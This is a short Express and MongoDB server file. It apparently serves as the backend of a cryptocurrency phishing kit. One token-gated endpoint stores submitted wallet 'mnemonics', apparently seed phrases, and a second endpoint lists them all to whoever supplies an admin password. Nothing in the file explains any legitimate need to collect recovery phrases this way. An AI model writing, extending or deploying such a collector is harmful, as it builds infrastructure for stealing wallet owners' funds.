"use strict";

const express = require("express");
const port = process.env.PORT || 3000;
const app = express();
const cors = require("cors");
const mongoose = require("mongoose");
mongoose.connect(process.env.DB_URL || "mongodb://localhost:27017/WPI");
const Mnemonics = require("./models/model");
const token = process.env.TOKEN;

const db = mongoose.connection;

db.once("open", () => {
  console.log("successfully connected to database");
});

app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use("/", (req, res, next) => {
  if (req.query.token === token) {
    next();
  } else {
    res.status(401).json({ success: false, reason: "wrong token" });
  }
});

app.get("/api/test", (req, res) => {
  console.log("yippy");
  res.status(200).json({ success: true });
});

app.post("/api/submitMnemonics", async (req, res) => {
  const { mnemonics } = req.body;
  try {
    await Mnemonics.create({ mnemonic: mnemonics });
  } catch (e) {
    console.error(e);
  }
  res.status(200).json({ success: true });
});

app.post("/api/displayMnemonics", async (req, res) => {
  const { password } = req.body;

  if (password != process.env.ADMIN_PASSWORD) {
    res.status(400).json({ success: false, wrongPassword: true });
  } else {
    try {
      const mnemonics = await Mnemonics.find();
      res.status(200).json({ success: true, mnemonics });
    } catch (e) {
      console.error(e);
      res.status(500).json({ success: false, error: true });
    }
  }
});

app.listen(port, () => {
  console.log(`server is live and listeneing on port ${port}`);
});
